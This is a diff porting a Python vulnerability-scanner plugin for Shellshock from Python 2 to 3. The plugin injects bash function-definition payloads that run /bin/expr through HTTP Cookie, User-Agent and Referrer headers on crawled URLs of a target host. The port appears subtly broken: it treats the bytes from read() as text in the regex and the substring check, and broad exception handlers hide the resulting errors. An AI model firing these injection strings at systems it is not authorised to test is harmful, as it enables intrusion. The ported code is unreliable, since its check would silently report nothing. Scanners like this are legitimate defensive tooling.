@@ -1,8 +1,8 @@
 # coding=utf-8
-import urllib2
+import urllib.request
 import re
-import urlparse
-import HTMLParser
+from urllib.parse import urlparse
+from html.parser import HTMLParser
 
 def get_plugin_info():
     plugin_info = {
@@ -20,7 +20,7 @@ def get_plugin_info():
 
 def get_url(domain, timeout):
     url_list = []
-    res = urllib2.urlopen('http://' + domain, timeout=timeout)
+    res = urllib.request.urlopen('http://' + domain, timeout=timeout)
     html = res.read()
     root_url = res.geturl()
     m = re.findall("<a[^>]*?href=('|\")(.*?)\\1", html, re.I)
@@ -38,7 +38,7 @@ def get_url(domain, timeout):
 def check(ip, port, timeout):
     try:
         url_list = get_url(ip + ":" + str(port), timeout)
-    except Exception, e:
+    except Exception as e:
         return
     try:
         flag_list = ['() { :; }; /bin/expr 32001611 - 100', '{() { _; } >_[$($())] { /bin/expr 32001611 - 100; }}']
@@ -50,12 +50,12 @@ def check(ip, port, timeout):
                 for flag in flag_list:
                     header = {'cookie': flag, 'User-Agent': flag, 'Referrer': flag}
                     try:
-                        request = urllib2.Request(url, headers=header)
-                        res_html = urllib2.urlopen(request).read()
-                    except urllib2.HTTPError, e:
+                        request = urllib.request.Request(url, headers=header)
+                        res_html = urllib.request.urlopen(request).read()
+                    except urllib.request.HTTPError as e:
                         res_html = e.read()
                     if "32001511" in res_html:
                         return u'shellshock命令执行漏洞'
-    except Exception, e:
+    except Exception as e:
         pass
 
